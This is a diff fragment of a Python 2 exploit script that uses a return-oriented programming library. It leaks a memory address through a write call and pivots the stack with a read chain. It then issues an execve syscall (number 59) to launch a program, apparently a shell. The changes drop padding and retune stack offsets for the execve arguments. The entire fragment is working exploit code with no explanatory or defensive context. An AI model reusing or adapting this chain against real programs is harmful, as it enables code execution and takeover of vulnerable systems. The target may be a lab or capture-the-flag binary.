@@ -19,8 +19,7 @@ p.write(p32(len(buf)) + buf)
 print "[+] read: %r" % p.read(len(buf))
 ref_addr = p.read_p64()
 
-buf = rop.junk()
-buf += rop.call_chain_plt(
+buf = rop.call_chain_plt(
     ['write', 1, ref_addr, 0x200000],
     ['read', 0, addr_stage-200, 200]
 , pivot=addr_stage-200)
@@ -29,8 +28,7 @@ buf += rop.fill(400, buf)
 p.write(buf)
 data = p.read(0x200000)
 
-buf = rop.junk()
-buf += rop.dynamic_syscall(ref_addr, data, 59, addr_stage-104, addr_stage-120, 0)
+buf = rop.dynamic_syscall(ref_addr, data, 59, addr_stage-112, addr_stage-128, 0)
 print "[+] offset to argv: %d" % (len(buf)-200)
 buf += p64(addr_stage-104)
 buf += p64(0)
